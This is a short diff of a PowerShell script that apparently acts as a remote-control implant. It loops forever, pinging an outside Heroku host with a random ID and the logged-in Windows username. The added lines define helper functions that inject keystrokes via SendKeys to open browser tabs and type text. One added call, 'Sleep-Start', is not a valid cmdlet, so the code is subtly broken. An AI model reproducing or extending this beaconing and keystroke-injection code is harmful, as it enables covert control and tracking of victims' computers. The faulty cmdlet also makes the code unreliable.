@@ -24,6 +24,20 @@ $ps = "";
 $id = Get-Random
 $username=( ( Get-WMIObject -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
 $wshell = New-Object -ComObject wscript.shell;
+
+function type {
+ param($string)
+ $wshell.SendKeys($string)
+}
+
+function search {
+ param($string)
+ type("^t")
+ Sleep-Start -m 250;
+ type($string)
+ type("{ENTER}")
+}
+
 while (1) 
 {
 (New-Object System.Net.WebClient).DownloadString("http://y44v5ltr.herokuapp.com/rs/ping/" + $id + "/" + $username)
